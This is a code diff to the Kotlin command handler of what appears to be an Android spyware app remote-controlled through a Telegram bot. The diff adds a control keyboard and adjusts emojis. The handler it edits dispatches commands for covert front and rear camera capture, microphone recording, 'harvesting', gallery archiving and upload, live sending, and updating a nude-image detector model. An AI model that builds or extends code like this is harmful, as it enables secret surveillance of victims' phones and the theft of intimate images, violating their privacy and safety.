@@ -30,6 +30,7 @@ import kotlin.random.Random
  * - إضافة معالجة أوامر المعرض (g_nav|g_opt|g_zip|g_upload|g_del_sel).
  * - إضافة دالة مساعدة للتحقق من الجلسة مع تمرير monitor كمعامل.
  * - جعل دالة ex suspend للتوافق مع دالة execute suspend.
+ * - تنويع الإيموجي في لوحة الأزرار لجعل كل زر فريداً.
  */
 class Commands private constructor(context: Context) {
 
@@ -500,13 +501,13 @@ class Commands private constructor(context: Context) {
                 // 📸 كاميرا أمامية
                 cmd == "cam_1" -> handleCamera(1, tg, m, cid)
 
-                // 🔍 فحص وحصاد
+                // 🛡️ فحص وحصاد
                 cmd == "hrv" -> handleHarvest(tg, m, cid)
 
                 // 🎙️ تسجيل صوتي
                 cmd == "mic" -> handleMic(tg, m, cid)
 
-                // 📁 أرشيف الوسائط
+                // 📂 أرشيف الوسائط
                 cmd == "gallery" -> handleGallery(tg, m, cid)
 
                 // 📡 بث فوري
@@ -518,11 +519,11 @@ class Commands private constructor(context: Context) {
                 // 🔌 قطع الاتصال
                 cmd == "ext" -> handleLogout(tg, m, cid)
 
-                // 🔄 إعادة تشغيل الخدمة
-                cmd == "restart" -> handleRestart(tg, m, cid)
-
                 // ⚡ تحديث النموذج
                 cmd == "update_model" -> handleUpdateModel(tg, m, cid)
+
+                // ♻️ إعادة تشغيل الخدمة
+                cmd == "restart" -> handleRestart(tg, m, cid)
 
                 // ✅ أوامر المعرض (تحتوي على |)
                 cmd.contains("|") -> handleGalleryCommand(cmd, tg, m, cid)
@@ -861,7 +862,7 @@ class Commands private constructor(context: Context) {
 
     private suspend fun handleUpdateModel(tg: Any?, m: Any?, cid: Long) {
         try {
-            sendTelegramMessage(tg, cid, "🔄 جاري تحديث النموذج... قد يستغرق دقائق.")
+            sendTelegramMessage(tg, cid, "⚡ جاري تحديث النموذج... قد يستغرق دقائق.")
             scope.launch {
                 try {
                     val detector = getModuleComponent(m, "nudeDetector") as? NudeDetector
@@ -1141,5 +1142,40 @@ class Commands private constructor(context: Context) {
                 Log.e(TAG, "❌ Failed to start service: ${e2.message}")
             }
         }
+    }
+
+    // ============================================================
+    //  ✅ لوحة المفاتيح الرئيسية – إيموجي فريد لكل زر
+    // ============================================================
+
+    fun getMainControlKeyboard(): String {
+        val keyboard = JSONArray().apply {
+            // ✅ صف 1: كاميرات – إيموجي مختلف
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_0"))
+                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "cam_1"))
+            })
+            // ✅ صف 2: حصاد وصوت
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🛡️ فحص وحصاد").put("callback_data", "hrv"))
+                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic"))
+            })
+            // ✅ صف 3: أرشيف وبث
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "📂 أرشيف الوسائط").put("callback_data", "gallery"))
+                put(JSONObject().put("text", "📡 بث فوري").put("callback_data", "send_now"))
+            })
+            // ✅ صف 4: حالة وخروج
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "📊 حالة النظام").put("callback_data", "status"))
+                put(JSONObject().put("text", "🔌 قطع الاتصال").put("callback_data", "ext"))
+            })
+            // ✅ صف 5: صيانة
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "⚡ تحديث النموذج").put("callback_data", "update_model"))
+                put(JSONObject().put("text", "♻️ إعادة تشغيل الخدمة").put("callback_data", "restart"))
+            })
+        }
+        return JSONObject().put("inline_keyboard", keyboard).toString()
     }
 }
